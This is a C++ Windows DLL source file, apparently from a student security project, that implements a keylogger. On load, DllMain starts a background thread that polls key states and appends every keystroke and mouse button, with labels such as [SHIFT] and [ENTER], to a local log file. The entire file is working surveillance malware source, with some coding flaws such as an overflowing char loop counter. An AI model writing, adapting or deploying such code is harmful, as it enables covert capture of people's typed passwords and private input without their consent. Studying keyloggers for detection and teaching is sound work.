#include <iostream>
#include <Windows.h>
#include <ctype.h>
#include <string.h>
#include <fstream>

using namespace std;

int Save(int _key, char const *file);
VOID ExecWorkerRoutine();

BOOL __stdcall DllMain(HINSTANCE hModule, DWORD dwReason, LPVOID lpReserved)
{
	if (dwReason == DLL_PROCESS_ATTACH)
	{
		DisableThreadLibraryCalls(hModule);
		// execute worker thread
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ExecWorkerRoutine, NULL, 0, NULL);
	}

	return TRUE; 
}

VOID ExecWorkerRoutine()
{
	char i;

	while (true)
	{
		for (i = 8; i <= 255; i++)
		{
			if (GetAsyncKeyState(i) == -32767)
			{
				Save(i, "C:\\CSCE465HonorsProject\\log.txt");
			}
		}
	}
}

int Save(int _key, char const* file)
{
	cout << _key << endl;

	Sleep(10);

	FILE* OUTPUT_FILE;

	OUTPUT_FILE = fopen(file, "a+");

	if (_key == VK_SHIFT) fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
	else if (_key == VK_BACK) fprintf(OUTPUT_FILE, "%s", "[BACK]");
	else if (_key == VK_RETURN) fprintf(OUTPUT_FILE, "%s", "[ENTER]");
	else if (_key == VK_ESCAPE) fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
	else if (_key == VK_TAB) fprintf(OUTPUT_FILE, "%s", "[TAB]");
	else if (_key == VK_CONTROL) fprintf(OUTPUT_FILE, "%s", "[CTRL]");
	else if (_key == VK_MENU) fprintf(OUTPUT_FILE, "%s", "[ALT]");
	else if (_key == VK_CAPITAL) fprintf(OUTPUT_FILE, "%s", "[CAPS]");
	else if (_key == VK_SPACE) fprintf(OUTPUT_FILE, "%s", "[SPACE]");
	else if (_key == VK_INSERT) fprintf(OUTPUT_FILE, "%s", "[INSERT]");
	else if (_key == VK_DELETE) fprintf(OUTPUT_FILE, "%s", "[DELETE]");
	else if (_key == VK_LBUTTON) fprintf(OUTPUT_FILE, "%s", "[LMOUSE]");
	else if (_key == VK_RBUTTON) fprintf(OUTPUT_FILE, "%s", "[RMOUSE]");
	else if (_key == VK_MBUTTON) fprintf(OUTPUT_FILE, "%s", "[MMOUSE]");
	else fprintf(OUTPUT_FILE, "%s", &_key);

	fclose(OUTPUT_FILE);

	return 0;
}